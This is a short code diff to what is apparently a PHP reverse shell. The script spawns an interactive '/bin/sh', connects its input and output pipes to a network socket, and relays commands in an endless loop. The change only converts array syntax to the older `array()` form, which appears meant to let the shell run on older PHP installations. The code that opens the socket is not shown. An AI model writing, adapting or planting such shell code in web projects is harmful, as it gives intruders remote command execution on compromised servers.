@@ -11,11 +11,11 @@ if (!$sock) exit;
 
 $process = proc_open(
     '/bin/sh -i',
-    [
-        ['pipe', 'r'], // stdin is a pipe that the child will read from
-        ['pipe', 'w'], // stdout is a pipe that the child will write to
-        ['pipe', 'w']  // stderr is a pipe that the child will write to
-    ],
+    array(
+        array('pipe', 'r'), // stdin is a pipe that the child will read from
+        array('pipe', 'w'), // stdout is a pipe that the child will write to
+        array('pipe', 'w')  // stderr is a pipe that the child will write to
+    ),
     $pipes
 );
 
@@ -27,11 +27,11 @@ foreach ($pipes as $pipe) {
 stream_set_blocking($sock, 0);
 
 for (;;) {
-    $read = [
+    $read = array(
         $sock,
         $pipes[1],
         $pipes[2]
-    ];
+    );
 
     if (in_array($sock, $read)) {
         $input = fread($sock, 8192);
